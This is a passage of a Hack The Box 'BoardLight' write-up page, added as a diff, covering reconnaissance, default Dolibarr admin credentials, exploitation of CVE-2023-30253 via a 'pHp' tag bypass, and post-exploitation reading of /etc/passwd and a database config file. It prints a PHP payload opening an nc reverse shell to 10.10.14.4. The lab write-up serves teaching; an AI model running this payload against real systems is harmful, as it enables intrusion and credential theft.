+                    <a href="#virtual-host-subdomain-enumeration" aria-label="Virtual Host Subdomain Enumeration">Virtual Host Subdomain Enumeration</a></li>
+                <li>
+                    <a href="#subdomain---crmboardhtb" aria-label="Subdomain - crm.board.htb">Subdomain - crm.board.htb</a></li></ul>
+                </li>
+                <li>
+                    <a href="#what-is-cve-2023-30253" aria-label="What is CVE-2023-30253?">What is CVE-2023-30253?</a><ul>
+                        
+                <li>
+                    <a href="#exploiting-rce-in-dolibarr-cve-2023-30253" aria-label="Exploiting RCE in Dolibarr (CVE-2023-30253)">Exploiting RCE in Dolibarr (CVE-2023-30253)</a></li>
+                <li>
+                    <a href="#alternative-and-easy-way---metasploit" aria-label="Alternative and easy way - metasploit">Alternative and easy way - metasploit</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#getting-user-shell" aria-label="Getting User shell">Getting User shell</a><ul>
+                        
+                <li>
+                    <a href="#attempt-1" aria-label="Attempt 1">Attempt 1</a></li>
+                <li>
+                    <a href="#attempt-2" aria-label="Attempt 2">Attempt 2</a></li>
+                <li>
+                    <a href="#user-flag-" aria-label="User Flag 🚩">User Flag 🚩</a></li></ul>
+                </li>
+                <li>
+                    <a href="#exploiting-dolibarr-for-rce-cve-2023-30253" aria-label="Exploiting Dolibarr for RCE (CVE-2023-30253)">Exploiting Dolibarr for RCE (CVE-2023-30253)</a><ul>
+                        
+                <li>
+                    <a href="#linpeas" aria-label="Linpeas">Linpeas</a></li>
+                <li>
+                    <a href="#enlightenment---cve-2022-37706" aria-label="Enlightenment - CVE-2022-37706">Enlightenment - CVE-2022-37706</a><ul>
+                        
+                <li>
+                    <a href="#exploit-cve-2022-37706" aria-label="Exploit CVE-2022-37706">Exploit CVE-2022-37706</a></li></ul>
+                </li>
+                <li>
+                    <a href="#root-flag-" aria-label="Root Flag 🚩">Root Flag 🚩</a></li>
+                <li>
+                    <a href="#how-does-cve-2022-37706-works" aria-label="How does CVE-2022-37706 works?">How does CVE-2022-37706 works?</a><ul>
+                        
+                <li>
+                    <a href="#find-the-suid-binaries-on-the-system-files-that-run-with-root" aria-label="Find the SUID binaries on the system files that run with root">Find the SUID binaries on the system files that run with root</a></li>
+                <li>
+                    <a href="#step-1-setup-required-directory" aria-label="Step 1: Setup Required Directory">Step 1: Setup Required Directory</a></li>
+                <li>
+                    <a href="#step-2-write-into-file-and-permission-assignment" aria-label="Step 2: Write into file and Permission assignment">Step 2: Write into file and Permission assignment</a></li>
+                <li>
+                    <a href="#step-3-trigger-the-exploit" aria-label="Step 3: Trigger the exploit">Step 3: Trigger the exploit</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a><ul>
+                        
+                <li>
+                    <a href="#key-takeaways" aria-label="Key Takeaways">Key Takeaways</a></li>
+                <li>
+                    <a href="#references" aria-label="References">References</a></li></ul>
+                </li>
+                <li>
+                    <a href="#connect-with-me" aria-label="Connect with Me">Connect with Me</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="box-info">Box Info<a hidden class="anchor" aria-hidden="true" href="#box-info">#</a></h2>
+<p><img alt="Box Information" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250705100226.png"></p>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Attribute</strong></th>
+          <th><strong>Details</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Level</strong></td>
+          <td>Easy</td>
+      </tr>
+      <tr>
+          <td><strong>OS</strong></td>
+          <td>Linux</td>
+      </tr>
+      <tr>
+          <td><strong>Box URL</strong></td>
+          <td><a href="https://app.hackthebox.com/machines/603/">https://app.hackthebox.com/machines/603/</a></td>
+      </tr>
+      <tr>
+          <td><strong>Box Status</strong></td>
+          <td>Retired</td>
+      </tr>
+      <tr>
+          <td><strong>About Box</strong></td>
+          <td>BoardLight is an easy-difficulty Linux machine that features a <code>Dolibarr</code> instance vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30253">CVE-2023-30253</a>. This vulnerability is leveraged to gain access as <code>www-data</code>. After enumerating and dumping the web configuration file contents, plaintext credentials lead to <code>SSH</code> access to the machine. Enumerating the system, a <code>SUID</code> binary related to <code>enlightenment</code> is identified which is vulnerable to privilege escalation via <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-37706">CVE-2022-37706</a> and can be abused to leverage a root shell.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="footprinting">Footprinting<a hidden class="anchor" aria-hidden="true" href="#footprinting">#</a></h2>
+<h3 id="nmap">Nmap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h3>
+<p>Let’s start by scanning the machine with Nmap to identify which services are running on different ports.</p>
+<h3 id="nmap-scan---basic">Nmap Scan - Basic<a hidden class="anchor" aria-hidden="true" href="#nmap-scan---basic">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --min-rate <span class="m">10000</span> <span class="nv">$ip</span> -oN 1.basic.nmap.txt
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-02 21:41 IST
+</span></span><span class="line"><span class="cl">Warning: 10.10.11.11 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.11
+</span></span><span class="line"><span class="cl">The host is up <span class="o">(</span>0.27s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">61627</span> closed TCP ports <span class="o">(</span>conn-refused<span class="o">)</span>, <span class="m">3906</span> filtered TCP ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 58.63 seconds
+</span></span></code></pre></div><h3 id="nmap-scan---detailed">Nmap Scan - Detailed<a hidden class="anchor" aria-hidden="true" href="#nmap-scan---detailed">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -Pn -sCV -p 22,80 10.10.11.11 -oN 3.detailed.nmap.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-02 21:46 IST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.11
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.31s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.77 seconds
+</span></span></code></pre></div><p>It was observed that the machine has ports 22(SSH) and 80 (HTTP) open. Let&rsquo;s do further enumeration and find out ways to catch the flag.</p>
+<h3 id="port-22-ssh">Port 22 SSH<a hidden class="anchor" aria-hidden="true" href="#port-22-ssh">#</a></h3>
+<p>We tried the same for SSH by attempting an anonymous login, but it was unsuccessful.</p>
+<p><strong>Anonymous Access - Denied</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ssh anonymous@10.10.11.11
+</span></span><span class="line"><span class="cl">anonymous@10.10.11.11<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Permission denied, please try again.
+</span></span></code></pre></div><h3 id="port-80-http">Port 80 HTTP<a hidden class="anchor" aria-hidden="true" href="#port-80-http">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; curl -I http://boardlight.htb/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Date: Wed, <span class="m">02</span> Jul <span class="m">2025</span> 16:31:42 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span></code></pre></div><p>Let&rsquo;s start with checking the security headers. Here application is responding with a basic header, which shows the server information <code>Apache/2.4.41 (Ubuntu)</code></p>
+<p><strong>Visual Presentation:</strong>
+<img alt="Application running on Port 80" loading="lazy" src="/images/HTB/Boardlight/screencapture-boardlight-htb-2025-07-02-22_11_41.png"></p>
+<p><strong>Let’s add boardlight host to our /etc/hosts file:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.11.11   board.htb&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span></code></pre></div><p>Application doesn&rsquo;t contain much functionality. It&rsquo;s just static website running on php and with minimal design. We can go with subdomain enumeration which can give us some more attack path. We will start vhost enumeration using gobuster or ffuf.</p>
+<h4 id="virtual-host-subdomain-enumeration">Virtual Host Subdomain Enumeration<a hidden class="anchor" aria-hidden="true" href="#virtual-host-subdomain-enumeration">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">&gt; gobuster vhost -u http://board.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain 
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:             http://board.htb/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:          GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:         <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:      gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:         10s
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Append Domain:   <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in VHOST enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Found: crm.board.htb Status: <span class="m">200</span> <span class="o">[</span>Size: 6360<span class="o">]</span>
+</span></span></code></pre></div><h4 id="subdomain---crmboardhtb">Subdomain - crm.board.htb<a hidden class="anchor" aria-hidden="true" href="#subdomain---crmboardhtb">#</a></h4>
+<p>We have identified the <code>crm.board.htb</code> subdomain during the subdomain enumeration process. It&rsquo;s running the Dolibarr with version 17.0.0</p>
+<p><strong>What is Dolibarr?</strong></p>
+<blockquote>
+<p><strong>Dolibarr is a free and open-source ERP (Enterprise Resource Planning) and CRM (Customer Relationship Management) software designed for small to medium-sized businesses, freelancers, and non-profits.</strong></p></blockquote>
+<p><img alt="Dolibarr CMS" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250702223243.png"></p>
+<p><strong>Headers:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ curl -i http://crm.board.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Date: Wed, <span class="m">02</span> Jul <span class="m">2025</span> 17:00:29 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Expires: Thu, <span class="m">19</span> Nov <span class="m">1981</span> 08:52:00 GMT
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">Cache-Control: Public, must-revalidate
+</span></span><span class="line"><span class="cl">X-Content-Type-Options: nosniff
+</span></span><span class="line"><span class="cl">X-Frame-Options: SAMEORIGIN
+</span></span><span class="line"><span class="cl">Referrer-Policy: same-origin
+</span></span><span class="line"><span class="cl">Set-Cookie: <span class="nv">DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92</span><span class="o">=</span>ajak7d8hjulbg1l4ulve30t8gj<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+</span></span><span class="line"><span class="cl">Vary: Accept-Encoding
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span></code></pre></div><p><strong>Possible available exploit:</strong>
+<img alt="Searchsploit output" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250702223510.png"></p>
+<blockquote>
+<p>No exploit available for Dolibarr version 17.0.0 on searchsploit</p></blockquote>
+<p>After doing further research about Dolibarr, it was identified that the application version 17.0.0 is vulnerable to authenticated remote code execution. We don&rsquo;t have dashboard credentials, so we have to find them.</p>
+<p>I came across a Dolibarr forum discussion about <strong>default credentials</strong> where community members are discussing about the default credentials. The default credentials for the dolibarr cms are <code>Admin: admin</code></p>
+<blockquote>
+<p><strong>Forum Discussion</strong>: <a href="https://www.dolibarr.org/forum/t/login-after-installation/16088/5">https://www.dolibarr.org/forum/t/login-after-installation/16088/5</a></p></blockquote>
+<p>Once we successfully authenticate to the portal, we can see the dashboard where users can manage users, set up the application and create a new website as well.</p>
+<p><img alt="Dolibarr Dashboard Overview" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250702224512.png"></p>
+<p>From the Github repo of Dolibarr, it was observed that Dolibarr uses PHP, which is an interesting thing.</p>
+<p><img alt="Github Repo of Dolibarr" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250702225312.png"></p>
+<p>Now that we have access to the Dolibarr admin panel, we can proceed with exploitation.</p>
+<h3 id="what-is-cve-2023-30253">What is CVE-2023-30253?<a hidden class="anchor" aria-hidden="true" href="#what-is-cve-2023-30253">#</a></h3>
+<p>Dolibarr before 17.0.1 allows remote code execution by an authenticated user via an uppercase manipulation: <code>&lt;?PHP</code> instead of <code>&lt;?php</code> in injected data.</p>
+<p><strong>Severity</strong>: High (8.8/10)</p>
+<table>
+  <thead>
+      <tr>
+          <th>CVSS v3 base metrics</th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Attack vector</td>
+          <td>Network</td>
+      </tr>
+      <tr>
+          <td>Attack complexity</td>
+          <td>Low</td>
+      </tr>
+      <tr>
+          <td>Privileges required</td>
+          <td>Low</td>
+      </tr>
+      <tr>
+          <td>User interaction</td>
+          <td>None</td>
+      </tr>
+      <tr>
+          <td>Scope</td>
+          <td>Unchanged</td>
+      </tr>
+      <tr>
+          <td>Confidentiality</td>
+          <td>High</td>
+      </tr>
+      <tr>
+          <td>Integrity</td>
+          <td>High</td>
+      </tr>
+      <tr>
+          <td>Availability</td>
+          <td>High</td>
+      </tr>
+  </tbody>
+</table>
+<h4 id="exploiting-rce-in-dolibarr-cve-2023-30253">Exploiting RCE in Dolibarr (CVE-2023-30253)<a hidden class="anchor" aria-hidden="true" href="#exploiting-rce-in-dolibarr-cve-2023-30253">#</a></h4>
+<ol>
+<li>Create the Website and enter the website name and description.
+<img alt="Create the website - Dolibarr" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250702224806.png"></li>
+<li>Once website name is created create new page and enter the page name and title
+<img alt="Create Page - Dolibarr" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250703105706.png"></li>
+<li>Initially, We start with normal system command to with basic <code>php</code> syntax.
+<img alt="Basic php payload" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250705151431.png">
+<strong>Response</strong>: Application throws an error saying &ldquo;system&rdquo; function is forbidden.
+<img alt="Error while saving the payload" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250705151448.png"></li>
+<li>As per CVE-2023-30253 description, We will change the php syntax from <code>php</code> to <code>pHp</code>.
+<img alt="Updated Payload - pHp" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250705151242.png">
+<strong>Response</strong>: We are successfully able to execute the system command.
+<img alt="Command Execution" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250705151402.png"></li>
+</ol>
+<p>We will use netcat bind shell to get the shell
+<img alt="Bind Shell" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250703110238.png">
+<strong>Code Snippet for Netcat Bind Shell</strong>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">section</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;mysection1&#34;</span> <span class="nx">contenteditable</span><span class="o">=</span><span class="s2">&#34;true&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">pHp</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.4 1337 &gt; /tmp/f&#34;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/section&gt;
+</span></span></span></code></pre></div><p>We got the connection back from the <code>crm</code> portal.
+<img alt="Bind Shell Connection" loading="lazy" src="/images/HTB/Boardlight/Pasted%20image%2020250703111221.png">
+<strong>TTY Stable Shell:</strong></p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+export TERM=xterm
+</code></pre><pre tabindex="0"><code>Ctrl + Z
+</code></pre><pre tabindex="0"><code>stty raw -echo; fg
+</code></pre><h4 id="alternative-and-easy-way---metasploit">Alternative and easy way - metasploit<a hidden class="anchor" aria-hidden="true" href="#alternative-and-easy-way---metasploit">#</a></h4>
+<p>We can also use the Metasploit to exploit the RCE and get the shell which requires username, password and hostname.</p>
+<p><strong>Read More Here:</strong></p>
+<blockquote>
+<p><a href="https://www.rapid7.com/db/modules/exploit/linux/http/dolibarr_cmd_exec/">https://www.rapid7.com/db/modules/exploit/linux/http/dolibarr_cmd_exec/</a></p></blockquote>
+<h2 id="getting-user-shell">Getting User shell<a hidden class="anchor" aria-hidden="true" href="#getting-user-shell">#</a></h2>
+<p>We have the access as a www-data user. First thing we tried was to check can we access home directory because <code>user.txt</code> file will be there. There is one directory which is called larissa. The user www-data doesn&rsquo;t have access to that directory.</p>
+<pre tabindex="0"><code>www-data@boardlight:/home$ ls -al
+total 12
+drwxr-xr-x  3 root    root    4096 May 17  2024 .
+drwxr-xr-x 19 root    root    4096 May 17  2024 ..
+drwxr-x--- 15 larissa larissa 4096 May 17  2024 larissa
+www-data@boardlight:/home$ whoami
+www-data
+www-data@boardlight:/home$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@boardlight:/home$ cd larissa/
+bash: cd: larissa/: Permission denied
+</code></pre><p>The directory structure suggests there is a user named <code>larissa</code>. Check the user existence by reading the <code>cat /etc/passwd</code> file.</p>
+<p><strong>Output of <code>/etc/passwd</code> file:</strong></p>
+<pre tabindex="0"><code>www-data@boardlight:/tmp$ cat /etc/passwd | grep &#34;larissa&#34;
+larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
+</code></pre><p>We don&rsquo;t have access to any interesting so we start looking at the application code available here at <code>/var/www/html</code>, which contains the application code for <code>board.htb</code> and <code>crm.board.htb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@boardlight:/$ <span class="nb">cd</span> /var/www/html
+</span></span><span class="line"><span class="cl">www-data@boardlight:~/html$ ls
+</span></span><span class="line"><span class="cl">board.htb  crm.board.htb
+</span></span></code></pre></div><p>We start exploitation by looking at the code for <code>board.htb</code>. It doesn&rsquo;t contain any connection string or any specific database connection file, which we usually observe in a PHP application. The board.htb is a normal static application without any functionality.</p>
+<pre tabindex="0"><code>www-data@boardlight:~/html/board.htb$ ls -al
+total 72
+drwxr-xr-x 5 www-data www-data  4096 May 17  2024 .
+drwxr-xr-x 4 www-data www-data  4096 May 17  2024 ..
+-rw-rw-r-- 1 larissa  larissa   9100 May 15  2024 about.php
+-rw-rw-r-- 1 larissa  larissa   9426 May 15  2024 contact.php
+drwxrwxr-x 2 larissa  larissa   4096 May 17  2024 css
+-rw-rw-r-- 1 larissa  larissa   9209 May 15  2024 do.php
+drwxrwxr-x 2 larissa  larissa   4096 May 17  2024 images
+-rw-rw-r-- 1 larissa  larissa  15949 May 15  2024 index.php
+drwxrwxr-x 2 larissa  larissa   4096 May 17  2024 js
+</code></pre><pre tabindex="0"><code>www-data@boardlight:~/html/board.htb$ ls -al js/
+total 228
+drwxrwxr-x 2 larissa  larissa    4096 May 17  2024 .
+drwxr-xr-x 5 www-data www-data   4096 May 17  2024 ..
+-rw-rw-r-- 1 larissa  larissa  131639 May 15  2024 bootstrap.js
+-rw-rw-r-- 1 larissa  larissa   88145 Aug  1  2019 jquery-3.4.1.min.js
+</code></pre><p>The <code>/var/www/html</code> directory contains the documentation and all the files for <code>board.htb</code> and <code>crm.board.htb</code>. There are multiple files available, which is too much for a quick search.</p>
+<p>The <code>crm.board.htb</code> contains multiple files because it&rsquo;s a crm application. We can search for configuration or backup files that may contain the username, password or database connection strings.</p>
+<pre tabindex="0"><code>www-data@boardlight:~/html/crm.board.htb$ ls -al
+total 632
+drwxr-xr-x  6 www-data www-data   4096 May 17  2024 .
+drwxr-xr-x  4 www-data www-data   4096 May 17  2024 ..
+drwxr-xr-x  4 www-data www-data   4096 Mar  4  2023 .github
+-rw-r--r--  1 www-data www-data    251 Mar  4  2023 .gitmessage
+-rw-r--r--  1 www-data www-data    211 Mar  4  2023 .stickler.yml
+-rw-r--r--  1 www-data www-data  35151 Mar  4  2023 COPYING
+-rw-r--r--  1 www-data www-data   6929 Mar  4  2023 COPYRIGHT
+-rw-r--r--  1 www-data www-data 508715 Mar  4  2023 ChangeLog
+-rw-r--r--  1 www-data www-data   1366 Mar  4  2023 DCO
+-rw-r--r--  1 www-data www-data   8016 Mar  4  2023 README-FR.md
+-rw-r--r--  1 www-data www-data  10282 Mar  4  2023 README.md
+-rw-r--r--  1 www-data www-data   6605 Mar  4  2023 SECURITY.md
+-rw-r--r--  1 www-data www-data   1911 Mar  4  2023 composer.json.disabled
+drwxr-xr-x 11 www-data www-data   4096 May 13  2024 documents
+drwxr-xr-x 79 www-data www-data   4096 Mar  4  2023 htdocs
+-rw-r--r--  1 www-data www-data    741 Mar  4  2023 nightwatch.conf.js
+-rw-r--r--  1 www-data www-data  11965 Mar  4  2023 phpstan.neon
+-rw-r--r--  1 www-data www-data     95 Mar  4  2023 robots.txt
+drwxr-xr-x 16 www-data www-data   4096 Mar  4  2023 scripts
+</code></pre><p>It was observed that the application has one interesting directory which contains the application configuration file here at <code>html/crm.board.htb/htdocs/conf</code>.</p>
+<pre tabindex="0"><code>www-data@boardlight:~/html/crm.board.htb/htdocs$ cd conf/
+www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls
+conf.php  conf.php.example  conf.php.old
+</code></pre><p>Upon opening the conf.php file, It was observed that it contains the database credentials like username, password and host and port details.</p>
+<p><strong>Configuration file content:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// File generated by Dolibarr installer 17.0.0 on May 13, 2024
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Take a look at conf.php.example file for an example of the conf.php file
+</span></span></span><span class="line"><span class="cl"><span class="c1">// and explanations for all possibles parameters.
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$dolibarr_main_url_root</span><span class="o">=</span><span class="s1">&#39;http://crm.board.htb&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_document_root</span><span class="o">=</span><span class="s1">&#39;/var/www/html/crm.board.htb/htdocs&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_url_root_alt</span><span class="o">=</span><span class="s1">&#39;/custom&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_document_root_alt</span><span class="o">=</span><span class="s1">&#39;/var/www/html/crm.board.htb/htdocs/custom&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_data_root</span><span class="o">=</span><span class="s1">&#39;/var/www/html/crm.board.htb/documents&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_db_host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_db_port</span><span class="o">=</span><span class="s1">&#39;3306&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_db_name</span><span class="o">=</span><span class="s1">&#39;dolibarr&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_db_prefix</span><span class="o">=</span><span class="s1">&#39;llx_&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_db_user</span><span class="o">=</span><span class="s1">&#39;dolibarrowner&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_db_pass</span><span class="o">=</span><span class="s1">&#39;#############&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_db_type</span><span class="o">=</span><span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_db_character_set</span><span class="o">=</span><span class="s1">&#39;utf8&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dolibarr_main_db_collation</span><span class="o">=</span><span class="s1">&#39;utf8_unicode_ci&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Authentication settings
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$dolibarr_main_authentication</span><span class="o">=</span><span class="s1">&#39;dolibarr&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//$dolibarr_main_demo=&#39;autologin,autopass&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Security settings
